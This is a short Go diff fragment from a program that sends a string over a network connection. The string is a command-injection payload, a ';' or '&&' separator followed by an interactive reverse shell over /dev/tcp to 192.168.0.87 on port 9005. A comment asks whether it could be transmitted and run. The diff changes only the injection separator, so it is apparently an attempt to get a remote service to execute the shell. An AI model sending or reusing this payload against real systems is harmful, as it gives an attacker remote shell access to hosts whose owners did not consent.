@@ -13,7 +13,7 @@ func main() {
 		return
 	}
 
-	_, err = conn.Write([]byte("&& sh -i >& /dev/tcp/192.168.0.87/9005 0>&1")) //Could this be transmitted and ran?
+	_, err = conn.Write([]byte("; sh -i >& /dev/tcp/192.168.0.87/9005 0>&1")) //Could this be transmitted and ran?
 
 	if err != nil {
 		fmt.Println("BROKE")
